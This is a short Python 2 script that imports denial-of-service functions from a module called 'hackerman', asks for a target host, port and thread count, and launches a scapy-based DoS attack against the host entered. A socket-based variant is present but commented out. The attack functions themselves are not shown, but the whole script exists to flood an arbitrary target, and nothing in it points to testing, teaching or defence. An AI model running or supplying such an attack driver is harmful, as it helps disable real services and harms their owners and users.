from hackerman import dos_attack,scapy_dos_attack

host=raw_input('HOST   : ')
port=raw_input('PORT   : ')
thread=raw_input('THREAD : ')


# Dos Attack Using Socket

#dos_attack(host,port,thread)

# Dos Attack Using scapy

scapy_dos_attack(host)
